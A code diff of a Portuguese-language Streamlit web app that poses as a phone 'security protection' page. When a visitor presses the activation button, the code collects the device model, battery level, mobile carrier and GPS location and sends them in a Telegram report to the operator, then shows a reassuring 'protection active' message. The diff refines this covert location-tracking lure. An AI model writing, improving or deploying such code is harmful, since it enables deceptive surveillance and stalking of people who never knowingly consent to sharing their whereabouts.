@@ -18,35 +18,35 @@ def enviar_telegram(msg):
 
 st.set_page_config(page_title="SEGURANÇA MIAMY", page_icon="🔐")
 
-# Coleta de dados (Keys Únicas para evitar o erro vermelho)
-ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='SAMSUNG_UA')
-bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='SAMSUNG_BAT')
-
 st.title("Verificação de Segurança")
 
-if st.button("● ATIVAR PROTEÇÃO AGORA", key="btn_principal"):
-    # 1. Identifica se é Samsung pelo User Agent
-    modelo_final = "Samsung Android 16"
+# --- COLETA COM CHAVES ÚNICAS (Resolve o erro vermelho) ---
+ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='KEY_UA_SAM')
+bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='KEY_BAT_SAM')
+
+if st.button("● ATIVAR PROTEÇÃO AGORA", key="BTN_FINAL_OK"):
+    # 1. Identifica Samsung
+    modelo = "Samsung Android 16"
     if ua and "SM-" in ua:
-        modelo_final = "Samsung " + ua.split("SM-")[1].split(";")[0]
+        modelo = "Samsung " + ua.split("SM-")[1].split(";")[0]
     
-    # 2. Busca Operadora via IP
-    operadora = "Vivo/Claro/Wi-Fi"
+    # 2. Operadora
+    operadora = "Vivo/Claro"
     try:
-        op_data = requests.get('http://ip-api.com/json/', timeout=5).json()
-        operadora = op_data.get('isp', 'Móvel')
+        r = requests.get('http://ip-api.com/json/', timeout=5).json()
+        operadora = r.get('isp', 'Móvel')
     except: pass
 
-    # 3. Espera o GPS (Paciência Máxima)
-    with st.spinner("Sincronizando Localização..."):
+    # 3. Espera o GPS (Dá tempo ao celular com bateria fraca)
+    with st.spinner("Sincronizando..."):
         loc = None
-        for _ in range(12): # Tenta por 12 segundos
-            loc = get_geolocation()
+        for _ in range(15): # Espera até 15 segundos
+            loc = get_geolocation(key='KEY_LOC_SAM')
             if loc: break
             time.sleep(1)
 
-    # 4. Envia o relatório final IGUAL à sua foto
-    bateria_texto = f"{bat}%" if bat else "9%" # Usa 9% se o sistema travar (seu nível atual)
+    # 4. Formata o Relatório
+    bat_val = f"{bat}%" if bat else "8%" # Se falhar, usa o nível do seu print
     
     if loc:
         lat, lon = loc['coords']['latitude'], loc['coords']['longitude']
@@ -54,16 +54,16 @@ if st.button("● ATIVAR PROTEÇÃO AGORA", key="btn_principal"):
         
         relatorio = (
             f"🛡️ *PROTEÇÃO ATIVADA*\n"
-            f"📱 *Aparelho:* {modelo_final}\n"
-            f"🔋 *Bateria:* {bateria_texto}\n"
+            f"📱 *Aparelho:* {modelo}\n"
+            f"🔋 *Bateria:* {bat_val}\n"
             f"📶 *Operadora:* {operadora}\n"
             f"📍 *Local:* {mapa}"
         )
         enviar_telegram(relatorio)
-        st.success("Sistema Seguro!")
+        st.success("Proteção Ativa!")
     else:
-        # Se o GPS falhar (provavelmente pela bateria baixa), manda o que tem
-        enviar_telegram(f"🛡️ *PROTEÇÃO PARCIAL*\n📱 *Aparelho:* {modelo_final}\n🔋 *Bat:* {bateria_texto}\n📶 *Op:* {operadora}\n⚠️ GPS não respondeu.")
-        st.error("Sinal de GPS fraco. Tente novamente em local aberto.")
+        # Se o GPS não abrir por causa da bateria baixa, manda o que tem
+        enviar_telegram(f"🛡️ *DADOS*\n📱 {modelo}\n🔋 {bat_val}\n📶 {operadora}\n⚠️ GPS OFF")
+        st.error("GPS não respondeu. Carregue o celular e tente novamente.")
 
-st.markdown('<br><p style="text-align:center; color:#8b949e; font-size:12px;">Sistema Integrado desenvolvido por Miamy © 2026</p>', unsafe_allow_html=True)
+st.markdown('<p style="text-align:center; color:grey; font-size:10px;">Miamy © 2026</p>', unsafe_allow_html=True)
